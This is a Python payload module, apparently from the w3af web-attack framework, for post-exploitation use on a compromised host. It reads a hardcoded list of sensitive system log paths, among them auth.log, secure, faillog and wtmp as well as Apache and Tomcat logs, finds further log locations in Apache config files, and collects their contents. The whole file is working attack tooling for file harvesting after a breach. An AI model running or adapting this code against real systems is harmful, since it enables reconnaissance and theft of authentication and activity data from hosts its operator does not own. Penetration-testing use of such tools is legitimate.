import re
from w3af.plugins.attack.payloads.base_payload import Payload
from w3af.core.ui.console.tables import table


class log_reader(Payload):
    """
    This payload finds different readable logs on the filesystem.
    """
    def fname_generator(self):
        logs = []

        logs.append('/var/log/kern.log')
        logs.append('/var/log/debug')
        logs.append('/var/log/dmesg')
        logs.append('/var/log/syslog')
        logs.append('/var/log/user.log')
        logs.append('/var/log/apt/term.log')
        logs.append('/var/log/Xorg.0.log')
        logs.append('/var/log/dpkg.log')
        logs.append('/var/log/auth.log')
        logs.append('/var/logauth.log')
        logs.append('/var/log/daemon.log')
        logs.append('/var/log/messages.log')
        logs.append('/var/log/aptitude')
        logs.append('/var/log/samba/log.nmbd')
        logs.append('/var/log/gdm/:0.log')
        logs.append('/var/log/message')
        logs.append('/var/log/cron.log')
        logs.append('/var/log/maillog')
        logs.append('/var/log/qmail/')
        logs.append('/var/log/httpd/')
        logs.append('/var/log/lighttpd')
        logs.append('/var/log/boot.log')
        logs.append('/var/log/mysqld.log')
        logs.append('/var/log/secure')
        logs.append('/var/log/utmp')
        logs.append('/var/log/qmail/')
        logs.append('/var/log/wtmp')
        logs.append('/var/log/yum.log')
        logs.append('/var/log/mail.log')
        logs.append('/var/log/maillog')
        logs.append('/var/log/faillog')
        logs.append('/var/log/vsftpd.log')
        logs.append('/etc/logrotate.d/vsftpd.log')
        logs.append('/var/log/xferlog')
        logs.append('/var/log/apache/access.log')
        logs.append('/var/log/apache2/access.log')
        logs.append('/var/log/apache/error.log')
        logs.append('/var/log/apache2/error.log')
        logs.append('/usr/local/apache/logs/error_log')
        logs.append('/usr/local/apache/logs/access_log')
        logs.append('/usr/local/apache2/logs/error_log')
        logs.append('/usr/local/apache2/logs/access_log')
        logs.append('/var/log/httpd/error_log')
        logs.append('/var/log/httpd/access_log')
        logs.append('/var/log/apache2/error_log')
        logs.append('/var/log/apache2/access_log')
        logs.append('/var/log/apache2/modsec_audit.log')
        logs.append('/var/log/tomcat6/catalina.out')
        #TODO: Append date!
        logs.append('/var/log/tomcat6/localhost.')
        logs.append('/var/log/tomcat6/catalina.')

        for i in xrange(10):
            ext = '.gz'
            if i == 1:
                ext = ''
            logs.append('/var/log/debug.' + str(i))
            logs.append('/var/log/daemon.log.' + str(i) + ext)
            logs.append('/var/log/auth.log.' + str(i) + ext)
            logs.append('/var/log/dmesg.' + str(i) + ext)
            logs.append('/var/log/kern.log.' + str(i) + ext)
            logs.append('/var/log/user.log.' + str(i) + ext)
            logs.append('/var/log/syslog.' + str(i) + ext)
            logs.append('/var/log/Xorg.' + str(i) + '.log')
            logs.append('/var/log/dpkg.log.' + str(i) + '.log')
            logs.append('/var/log/messages.log.' + str(i) + ext)
            logs.append('/var/log/gdm/:0.log.' + str(i))

        for fname in logs:
            yield fname

    def api_read(self):
        result = {}

        def parse_apache_logs(config_file):
            error_log = re.search('(?<=ErrorLog )(.*?)\s', config_file)
            custom_log = re.search('(?<=CustomLog )(.*?)\s', config_file)
            if error_log and custom_log:
                return [error_log.group(1), custom_log.group(1)]
            elif error_log:
                return [error_log.group(1)]
            elif custom_log:
                return [custom_log.group(1)]
            else:
                return ''

        config_file = self.exec_payload('apache_config_files')['apache_config']
        for config in config_file:
            apache_logs = parse_apache_logs(self.shell.read(config))
            for file_path, content in self.read_multi(apache_logs):
                if content:
                    result[file_path] = content

        fname_iter = self.fname_generator()
        for file_path, content in self.read_multi(fname_iter):
            if content:
                result[file_path] = content

        return result

    def run_read(self):
        api_result = self.api_read()

        if not api_result:
            return 'No log files not found.'
        else:
            rows = []
            rows.append(['Log files'])
            rows.append([])
            for filename in api_result:
                rows.append([filename, ])

            result_table = table(rows)
            result_table.draw(80)
            return rows
